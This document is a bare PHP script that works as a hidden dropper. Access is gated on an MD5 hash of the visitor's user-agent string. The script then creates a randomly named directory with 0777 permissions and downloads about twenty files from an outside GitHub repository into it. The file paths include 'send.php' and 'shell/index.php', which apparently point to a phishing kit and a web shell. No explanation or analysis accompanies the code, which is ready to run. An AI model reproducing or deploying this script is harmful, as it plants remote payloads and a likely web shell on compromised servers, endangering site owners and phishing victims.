<?php
// Define the encoded MD5 hash of the user-agent string
$encodedUserAgentHash = 'd8c4a4e8e9afafcd0136f2955ac6a248';

// Get the user-agent from the request
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Hash the user-agent from the request using MD5
$hashedUserAgent = md5($userAgent);

// Check if the hashed user-agent matches the encoded hash
if ($hashedUserAgent === $encodedUserAgentHash) {
    // User-agent matched, allow access to the page
    echo "Welcome!";
    // Put your page content here
} else {
    // User-agent doesn't match, deny access
    http_response_code(403);
    echo "Access Denied";
    // Stop further execution
    exit;
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

function downloadFile($url, $destination) {
    $fileContent = file_get_contents($url);
    file_put_contents($destination, $fileContent);
}

// Generate random directory name
$randomDirName = generateRandomString(10);

// Create the random directory
if (!mkdir($randomDirName, 0777, true)) {
    die('Failed to create directories.');
}

// Mapping of URL to local path for downloading
$filesToDownload = [
    '/main/index.php' => '/index.php',
    '/main/Green.php' => '/Green.php',
    '/main/z.php' => '/z.php',
    '/main/991176.php' => '/991176.php',
    '/main/content.php' => '/content.php',
    '/main/xt/index.php' => '/xt/index.php',
    '/main/xt/mmd/send.php' => '/xt/mmd/send.php',
    '/main/xt/mmd/index.php' => '/xt/mmd/index.php',
    '/main/xt/mmd/a.txt' => '/xt/mmd/a.txt',
    '/main/xt/mmd/ht.txt' => '/xt/mmd/ht.txt',
    '/main/xt/mmd/shell/index.php' => '/xt/mmd/shell/index.php',
    '/main/mm/index.php' => '/mm/index.php',
    '/main/mm/mmd/index.php' => '/mm/mmd/index.php',
    '/main/mm/mmd/a.txt' => '/mm/mmd/a.txt',
    '/main/mm/mmd/r.txt' => '/mm/mmd/r.txt',
    '/main/mm/mmd/h.txt' => '/mm/mmd/h.txt',
    '/main/n/index.php' => '/n/index.php',
    '/main/ab/index.php' => '/ab/index.php',
    '/main/ab/a.txt' => '/ab/a.txt'
];

// Iterate over the filesToDownload array and download each file
foreach ($filesToDownload as $urlPath => $localPath) {
    $fullLocalPath = $randomDirName . $localPath;
    $fullUrl = "https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy" . $urlPath;
    $directory = dirname($fullLocalPath);

    // Create directory if it does not exist
    if (!is_dir($directory) && !mkdir($directory, 0777, true)) {
        die('Failed to create directory: ' . $directory);
    }

    // Download the file
    downloadFile($fullUrl, $fullLocalPath);
}

echo "Done! Random directory name: $randomDirName";
?>
